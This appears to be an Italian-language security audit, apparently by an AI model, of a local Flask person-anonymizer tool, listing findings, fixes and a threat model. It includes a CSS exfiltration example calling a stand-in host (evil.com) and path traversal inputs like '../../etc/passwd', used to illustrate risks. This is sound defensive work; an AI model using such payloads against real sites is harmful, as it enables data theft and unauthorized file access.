# Security Audit Report — Person Anonymizer v7.1

**Data**: 2026-04-01
**Analista**: Senior Security Engineering (claude-sonnet-4-6)
**Scope**: Tutti i file sorgente Python e JS del progetto
**Tipo**: Security Code Review completo (P0 → P1 → P2 + Trust Boundary Analysis)

---

## Panoramica

- **File analizzati**: 12 (7 Python backend, 3 JS frontend, 1 HTML template, 1 requirements.txt)
- **Vulnerabilità trovate**: CRITICAL 0 · HIGH 1 · MEDIUM 3 · LOW 4
- **Giudizio complessivo**: Postura di sicurezza solida per un tool locale; le misure esistenti (path traversal check, job_id validation, security headers, sanitizzazione XSS via textContent/createTextNode) sono corrette e deliberate. I problemi residui sono tutti sfruttabili solo in contesti specifici o richiedono configurazioni non default.

---

## Findings

### HIGH — Nessuna autenticazione sull'interfaccia web (CWE-306)

**Location**: `person_anonymizer/web/app.py` — tutti gli endpoint (`/api/upload`, `/api/start`, `/api/download`, etc.)

**Issue**: L'app Flask viene avviata in binding su `127.0.0.1:5000` (localhost only), il che la protegge dall'accesso esterno diretto. Tuttavia, non esiste nessun meccanismo di autenticazione. Chiunque sul sistema locale (o via proxy/tunnel deliberato) può:
- Caricare video arbitrari fino a 10 GB
- Avviare la pipeline YOLO (CPU/GPU intensiva) quante volte vuole
- Scaricare qualsiasi output prodotto da qualunque `job_id`
- Leggere le annotazioni JSON di job altrui se conosce il job_id

**Impact**: Su una macchina multiutente o in ambienti dove localhost è raggiungibile tramite SSRF da altra applicazione, qualunque processo locale può controllare il tool. Il `job_id` è un hex a 12 caratteri (48 bit di entropia), teoricamente enumerabile in un contesto locale con forza bruta rapida.

**Fix**:
Per uso strettamente personale/single-user la situazione attuale è accettabile, ma documentarla esplicitamente. Per usi condivisi:
```python
# Aggiungere in app.py
import secrets

# Token statico all'avvio (o da variabile d'ambiente)
API_TOKEN = os.environ.get("ANONYMIZER_TOKEN", secrets.token_urlsafe(32))

def require_auth():
    token = request.headers.get("X-API-Token") or request.args.get("token")
    if token != API_TOKEN:
        return jsonify({"error": "Unauthorized"}), 401

# Applicare a tutti gli endpoint sensibili con before_request
@app.before_request
def check_auth():
    if request.path.startswith("/api/"):
        return require_auth()
```

---

### MEDIUM — Path del video inviato dal client a `/api/start` (CWE-610)

**Location**: `person_anonymizer/web/app.py:157-163`

**Issue**: L'endpoint `/api/start` accetta `video_path` come stringa dal corpo JSON del client:
```python
video_path = data.get("video_path")
if not video_path or not Path(video_path).exists():
    return jsonify({"error": "Video non trovato"}), 404

resolved = Path(video_path).resolve()
if not str(resolved).startswith(str(UPLOAD_DIR.resolve())):
    return jsonify({"error": "Path non autorizzato"}), 403
```
La guardia con `startswith` è presente e funzionante. Il problema rimane in `Path(video_path).exists()` che viene chiamato PRIMA della verifica del path. Su filesystem locali con symlink, un path come `/uploads/abc123/../../etc/passwd` risolve e poi fallisce la guardia — ma l'esistenza del file viene verificata prima. Questo non è direttamente exploitabile nella configurazione corrente, ma è un pattern fragile che potrebbe diventare critico se la logica cambia.

**Impact**: La verifica `exists()` su path arbitrario prima della sanitizzazione può essere usata come oracle di esistenza di file locali (information disclosure).

**Fix**:
```python
# Invertire l'ordine: prima sanifica, poi verifica esistenza
video_path = data.get("video_path")
if not video_path:
    return jsonify({"error": "video_path mancante"}), 400

resolved = Path(video_path).resolve()
if not str(resolved).startswith(str(UPLOAD_DIR.resolve())):
    return jsonify({"error": "Path non autorizzato"}), 403

if not resolved.exists():
    return jsonify({"error": "Video non trovato"}), 404
```

---

### MEDIUM — `_build_config` accetta parametri non validati da input web (CWE-20)

**Location**: `person_anonymizer/web/pipeline_runner.py:18-81`

**Issue**: La funzione `_build_config` mappa direttamente i valori provenienti dal JSON del client su `PipelineConfig` senza validare tipi o range:
```python
kwargs[config_key] = val  # val = qualsiasi cosa il client abbia inviato
return PipelineConfig(**kwargs)
```
Un client malevolo può inviare, per esempio:
- `detection_confidence: "../../etc/passwd"` — `PipelineConfig` accetta qualsiasi valore, la validazione avviene solo a runtime nella pipeline YOLO che lancia un'eccezione non gestita
- `max_refinement_passes: 9999999` — DoS via iterazioni infinite
- `yolo_model: "/etc/passwd"` — YOLO tenta di caricare quel file come modello (poi fallisce, ma genera un traceback con il path nel messaggio di errore)
- `sliding_window_grid: -1` — divisione per zero potenziale in `get_window_patches`

**Impact**: DoS locali (iterazioni eccessive), leak parziali di informazioni di sistema via messaggi di errore, comportamento imprevedibile della pipeline.

**Fix**:
```python
def _validate_config_params(web_config: dict) -> tuple[bool, str]:
    """Valida i parametri di configurazione prima di applicarli."""
    validators = {
        "detection_confidence": lambda v: isinstance(v, (int, float)) and 0.01 <= v <= 0.99,
        "nms_iou_threshold": lambda v: isinstance(v, (int, float)) and 0.0 < v < 1.0,
        "max_refinement_passes": lambda v: isinstance(v, int) and 1 <= v <= 10,
        "sliding_window_grid": lambda v: isinstance(v, int) and 1 <= v <= 10,
        "anonymization_intensity": lambda v: isinstance(v, int) and 1 <= v <= 100,
        "yolo_model": lambda v: isinstance(v, str) and v in {"yolov8x.pt", "yolov8n.pt"},
        "operation_mode": lambda v: v in {"auto", "manual"},
        "anonymization_method": lambda v: v in {"pixelation", "blur"},
    }
    for key, validator in validators.items():
        if key in web_config and not validator(web_config[key]):
            return False, f"Parametro non valido: {key}"
    return True, ""
```

---

### MEDIUM — `debug=False` ma errori YOLO/ffmpeg espongono path locali (CWE-209)

**Location**: `person_anonymizer/web/pipeline_runner.py:333-354`

**Issue**: La gestione delle eccezioni in `_run` è corretta per `Exception` generica (messaggio generico + logging interno). Tuttavia, `SystemExit` viene gestita con:
```python
except SystemExit as e:
    self._sse.emit(job_id, "error", {
        "message": f"Pipeline terminata con codice {e.code}",
    })
```
Il codice `e.code` può essere una stringa (quando `sys.exit("messaggio")` viene chiamato con argomento stringa), che può contenere il path locale del file in elaborazione: `sys.exit(1)` viene chiamato da `run_pipeline` con precedente print del path. La `StdoutCapture` cattura queste print e le invia come eventi `log` al client, inclusi path del filesystem locale.

**Impact**: Il client riceve i path assoluti del filesystem server (es. `/home/bonn/Documenti/.../uploads/abc123/Camera-Sicurezza.mp4`). In un contesto multi-utente è information disclosure, per un uso puramente locale è accettabile ma non ideale.

**Fix**:
```python
# In pipeline_runner.py: filtrare i messaggi di log che contengono path assoluti
def _sanitize_log_message(msg: str) -> str:
    """Rimuove path assoluti dai messaggi di log."""
    import re
    return re.sub(r'/[^\s]+/uploads/[^\s]+', '[FILE]', msg)
```
Oppure, più semplicemente, non emettere stdout capture al client per le righe che iniziano con "Errore:".

---

### LOW — Nessun rate limiting sugli endpoint di upload e start (CWE-770)

**Location**: `person_anonymizer/web/app.py:73-108`, `app.py:145-172`

**Issue**: Non esiste rate limiting su `/api/upload` e `/api/start`. Un client può inviare:
- Migliaia di richieste di upload per riempire il disco
- Richieste di avvio pipeline multiple (anche se una guardia impedisce pipeline concorrenti, le richieste rimangono accodate nel thread)

Il limite di 10 GB per singolo file (`MAX_CONTENT_LENGTH`) è presente, ma non limita il numero di upload distinti.

**Impact**: DoS via esaurimento spazio disco o CPU. Accettabile per uso locale single-user, problematico se esposto in rete.

**Fix**: Per uso locale è sufficiente documentare. Per rete, usare `flask-limiter`:
```python
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)

@app.route("/api/upload", methods=["POST"])
@limiter.limit("10 per minute")
def upload_video():
    ...
```

---

### LOW — `validate_job_id` usa regex senza limite di lunghezza esplicita (CWE-400)

**Location**: `person_anonymizer/web/app.py:40-44`

**Issue**:
```python
def validate_job_id(job_id: str) -> bool:
    if not job_id:
        return False
    return bool(re.match(r"^[a-f0-9]{12}$", job_id))
```
La regex è corretta e usa ancore `^` e `$`. Il problema è che `job_id` non viene limitato prima della regex — un input di 1 MB di caratteri viene passato alla regex prima di verificare la lunghezza. Non è ReDoS (la regex è lineare), ma è un pattern inefficiente per un parametro con lunghezza fissa nota.

**Fix** (difensivo):
```python
def validate_job_id(job_id: str) -> bool:
    if not job_id or len(job_id) != 12:
        return False
    return bool(re.match(r"^[a-f0-9]{12}$", job_id))
```

---

### LOW — File temporanei `.avi` con nome prevedibile (CWE-377)

**Location**: `person_anonymizer/person_anonymizer.py:671-672`

**Issue**:
```python
temp_video_path = str(output_dir / f"{input_stem}_temp_noaudio.avi")
temp_debug_path = str(output_dir / f"{input_stem}_temp_debug.avi")
```
Il nome del file temporaneo è deterministico basato sul nome del file di input. In un contesto multi-utente, se due utenti elaborano lo stesso file contemporaneamente, i file temporanei si sovrascrivono. Non è exploitabile come TOCTOU nel contesto attuale (directory per-job), ma è un pattern da evitare.

**Fix**:
```python
import tempfile
temp_video_path = str(output_dir / f"{input_stem}_temp_{uuid.uuid4().hex[:8]}_noaudio.avi")
```

---

### LOW — Content-Security-Policy con `unsafe-inline` su `style-src` (CWE-1021)

**Location**: `person_anonymizer/web/app.py:52-58`

**Issue**:
```python
"Content-Security-Policy": (
    "default-src 'self'; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    ...
)
```
`unsafe-inline` su `style-src` consente CSS injection via attributo `style`. Se un futuro endpoint riflette input utente in un contesto HTML dove l'attaccante può iniettare attributi di stile, può essere usato per click-jacking o per estrarre dati via CSS exfiltration (es. `input[value^="a"] { background: url(//evil.com/a) }`).

**Impact**: Basso nel contesto attuale (nessun input riflesso in HTML), ma la flag riduce la protezione in profondità della CSP.

**Fix**: Usare `nonce` o `hash` per gli stili inline critici, oppure spostare tutti gli stili inline in un file CSS separato ed eliminare `unsafe-inline`:
```python
"style-src 'self' https://fonts.googleapis.com; "
```

---

## Threat Model (STRIDE)

| Minaccia | Categoria STRIDE | Componente | Mitigazione attuale | Residuo |
|---|---|---|---|---|
| Upload di file non-video (eseguibile rinominato .mp4) | Tampering | `/api/upload` | Verifica estensione + `secure_filename`. OpenCV non esegue il file, lo legge come stream binario. | Basso — OpenCV fallisce silenziosamente su file non-video |
| Path traversal via `video_path` in `/api/start` | Tampering | `/api/start` | `startswith(UPLOAD_DIR)` guard | Path verificato prima della sanitizzazione (vedi MEDIUM sopra) |
| Enumerazione output di altri job | Information Disclosure | `/api/download/<job_id>` | `job_id` a 48 bit di entropia (hex 12 char) | Basso per uso locale, alto su rete |
| DoS via upload massivo | Denial of Service | `/api/upload` | `MAX_CONTENT_LENGTH = 10 GB` per singolo file | Nessun limite sul numero di upload |
| Injection via nomi file malevoli | Tampering | Upload handler | `werkzeug.utils.secure_filename` + `Path().suffix` | Corretto |
| XSS via messaggi SSE riflessi nel DOM | XSS | `app.js`, SSE handler | `textContent` / `createTextNode` usati correttamente | Nessun rischio residuo |
| SSRF via YOLO model path | SSRF | `pipeline_runner.py` | `yolo_model` non viene usato come URL; solo come path locale | Non applicabile |
| Injection comandi via ffmpeg | Command Injection | `postprocessing.py` | `ffmpeg-python` usa `subprocess` con lista di argomenti (non `shell=True`) | Corretto — nessuna injection possibile |

---

## Security Headers Mancanti / Presenti

| Header | Stato | Note |
|---|---|---|
| `X-Content-Type-Options: nosniff` | Presente | Corretto |
| `X-Frame-Options: DENY` | Presente | Corretto |
| `Referrer-Policy: strict-origin-when-cross-origin` | Presente | Corretto |
| `Content-Security-Policy` | Presente | `unsafe-inline` su `style-src` (vedi LOW) |
| `Strict-Transport-Security` | Assente | Non necessario per localhost HTTP |
| `Permissions-Policy` | Assente | Consigliato per disabilitare camera/microphone |
| `Cache-Control` | Assente su risorse statiche | Consigliato `no-store` per output sensibili |

**Raccomandazione**: aggiungere `Permissions-Policy: camera=(), microphone=(), geolocation=()` e `Cache-Control: no-store` sugli endpoint `/api/download/*`.

---

## Priorità di Remediation

1. **Invertire ordine path check in `/api/start`** (5 min, nessun rischio regressione) — elimina l'oracle di esistenza file locali.
2. **Aggiungere validazione parametri in `_build_config`** (30 min) — previene DoS via parametri estremi e messaggi di errore informativi.
3. **Aggiungere lunghezza check prima della regex in `validate_job_id`** (2 min, triviale).
4. **Documentare esplicitamente il requisito localhost-only** nel README — chiarisce il threat model inteso e previene deployment errati.
5. **Aggiungere `Permissions-Policy` e `Cache-Control: no-store` su download** (5 min).

---

## Analisi punti di forza (già corretti)

Il progetto presenta diverse misure di sicurezza deliberate e ben implementate che meritano di essere citate:

- **`werkzeug.utils.secure_filename`** usato correttamente su tutti gli upload
- **Validazione `job_id` con regex rigorosa** `^[a-f0-9]{12}$` su ogni endpoint
- **Verifica `startswith(UPLOAD_DIR)`** per prevenire path traversal — logica corretta, solo l'ordine delle operazioni va invertito
- **`ffmpeg-python` senza `shell=True`** — nessuna injection possibile nel comando ffmpeg
- **`subprocess` con lista argomenti** ovunque nel progetto
- **XSS assente nel frontend** — `textContent` e `createTextNode` usati sistematicamente in `app.js`; nessun `innerHTML` con dati utente
- **`debug=False`** in produzione (app.py riga 378)
- **`MAX_CONTENT_LENGTH = 10 GB`** configurato
- **Security headers** presenti (`X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `CSP`)
- **`app.config["MAX_CONTENT_LENGTH"]` configurato** — previene DoS via singolo upload enorme
- **Nessuna credenziale hardcoded** nel codice sorgente
- **`.gitignore` robusto** — esclude `.env`, credenziali, video, modelli AI

---

## Verdict

Per un tool di uso locale single-user, la postura di sicurezza è buona. Le misure anti-traversal, anti-injection e anti-XSS sono corrette e deliberate. Il problema principale è l'assenza di autenticazione (architettura scelta consapevolmente per semplicità d'uso) e la validazione incompleta dei parametri di configurazione in ingresso. Prima di qualsiasi esposizione su rete (anche LAN), risolvere almeno i due MEDIUM sulla validazione parametri e sull'ordine del path check.
